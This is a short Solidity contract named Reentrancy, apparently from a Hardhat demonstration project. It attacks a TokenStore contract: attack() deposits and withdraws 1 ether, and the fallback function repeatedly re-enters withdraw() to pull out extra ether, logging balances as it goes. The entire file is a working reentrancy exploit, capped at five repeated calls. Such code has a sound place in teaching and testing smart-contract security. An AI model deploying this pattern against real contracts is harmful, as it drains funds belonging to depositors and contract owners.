//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "./TokenStore.sol";
import "./IReceiver.sol";
import "hardhat/console.sol";

contract Reentrancy is IReceiver {
  TokenStore public tokenStore;

  uint256 private _count;

  constructor(address _tokenStoreAddr) {
    tokenStore = TokenStore(_tokenStoreAddr);
    _count = 0;
  }

  // receive() external payable {
  //   console.log("Received", msg.value / 10**18, "ethers!");
  // }

  fallback() external payable {
    console.log("Fallback!");
    console.log("Store balance after:", tokenStore.getThisBalance() / 10**18);
    console.log("Caller balance after:", getThisBalance() / 10**18);
    console.log("count =", ++_count, "\n");
    if (address(tokenStore).balance >= 1 ether && _count < 5) {
      tokenStore.withdraw(1 ether);
    }
  }

  function attack() external payable {
    require(msg.value > 0, "Value must be > 0!");
    tokenStore.deposit{value: 1 ether}();
    tokenStore.withdraw(1 ether);
  }
}
